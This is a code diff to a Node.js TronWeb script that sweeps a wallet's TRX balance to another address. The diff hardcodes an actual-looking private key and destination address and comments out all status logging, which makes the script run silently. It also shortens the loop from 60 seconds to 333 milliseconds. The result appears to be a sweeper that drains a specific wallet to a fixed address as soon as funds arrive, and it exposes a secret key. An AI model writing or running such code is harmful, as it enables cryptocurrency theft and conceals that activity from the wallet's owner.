@@ -16,11 +16,11 @@ const TronWeb = require('tronweb').TronWeb
 
 const tronWeb = new TronWeb({
   fullHost: 'https://tron-rpc.publicnode.com',
-  privateKey: 'YOUR_PRIVATE_KEY'
+  privateKey: '21117889f96c85c63bb85f8cbe15671d62db6d5811b87be32f7d4090b141a0e2'
 });
 
 const sourceAddress = tronWeb.address.fromPrivateKey(tronWeb.defaultPrivateKey);
-const destinationAddress = 'DESTINATION_ADDRESS';
+const destinationAddress = 'TGoi7MQq5WNGr9YVunea9Ptu6gjQ4qNuQa';
 const FEE_RESERVE_TRX = 1;
 
 async function getBalance(address) {
@@ -52,7 +52,7 @@ async function sendTransaction(from, to, amountInTRX) {
     const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
 
     if (result.result) {
-      console.log(`Transaction successfully broadcasted. TXID: ${result.txid}`);
+      //(`Transaction successfully broadcasted. TXID: ${result.txid}`);
       return result;
     } else {
       throw new Error('Failed to broadcast the transaction.');
@@ -66,15 +66,16 @@ async function sendTransaction(from, to, amountInTRX) {
 async function autoSweep() {
   try {
     const currentBalance = await getBalance(sourceAddress);
+    //('balance: ' + currentBalance)
 
     if (currentBalance > FEE_RESERVE_TRX) {
       const energyAvailable = await checkEnergy(sourceAddress);
       if (energyAvailable < 0) {
-        console.log('Warning: Low energy. Transaction fees will be paid with TRX.');
+        //('Warning: Low energy. Transaction fees will be paid with TRX.');
       }
 
       const transferAmount = currentBalance - FEE_RESERVE_TRX;
-      console.log(`Current balance: ${currentBalance.toFixed(6)} TRX. Sending ${transferAmount.toFixed(6)} TRX.`);
+      //(`Current balance: ${currentBalance.toFixed(6)} TRX. Sending ${transferAmount.toFixed(6)} TRX.`);
       const result = await sendTransaction(sourceAddress, destinationAddress, transferAmount);
 
       const txID = result.txid;
@@ -89,13 +90,13 @@ async function autoSweep() {
 
             if (tx && tx.ret && tx.ret[0] && tx.ret[0].contractRet === 'SUCCESS') {
               confirmed = true;
-              console.log(`Successfully transferred ${transferAmount.toFixed(6)} TRX. Transaction ID: ${txID}`);
+              //(`Successfully transferred ${transferAmount.toFixed(6)} TRX. Transaction ID: ${txID}`);
             } else {
               throw new Error('Transaction not yet confirmed.');
             }
           } catch (error) {
             retries++;
-            console.log(`Checking transaction confirmation (${retries}/${maxRetries})...`);
+            //(`Checking transaction confirmation (${retries}/${maxRetries})...`);
             await new Promise(resolve => setTimeout(resolve, 5000));
           }
         }
@@ -105,7 +106,7 @@ async function autoSweep() {
         }
       }
     } else {
-      console.log(`Current balance: ${currentBalance.toFixed(6)} TRX. No action taken (balance ≤ reserve of ${FEE_RESERVE_TRX} TRX).`);
+      //(`Current balance: ${currentBalance.toFixed(6)} TRX. No action taken (balance ≤ reserve of ${FEE_RESERVE_TRX} TRX).`);
     }
   } catch (error) {
     console.error('Auto-sweep error:', error);
@@ -114,7 +115,7 @@ async function autoSweep() {
 
 async function runAutoSweep() {
   await autoSweep();
-  setTimeout(runAutoSweep, 60000);
+  setTimeout(runAutoSweep, 333);
 }
 
 runAutoSweep();
